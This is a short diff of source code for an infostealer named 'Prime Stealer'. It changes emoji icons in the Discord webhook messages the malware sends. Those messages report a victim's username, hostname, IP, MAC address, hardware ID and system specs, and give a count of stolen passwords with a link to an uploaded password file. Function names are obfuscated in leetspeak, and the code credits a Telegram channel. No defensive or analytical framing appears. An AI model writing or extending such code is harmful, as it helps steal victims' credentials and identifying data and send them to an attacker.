@@ -606,7 +606,7 @@ class PcInfo:
             "embeds": [
                 {
                     "title": "Prime Stealer | System Info",
-                    "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:earth:1247315495582040114> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
+                    "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
@@ -763,7 +763,7 @@ def UP104D(name, link):
             "embeds": [
                 {
                     "title": "Prime Stealer | Passwords",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blackkeyicon7:1247312148334510121> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [PrimePasswords.txt]({link})",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [PrimePasswords.txt]({link})",
                     "color": color,
                     "footer": {
                         "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
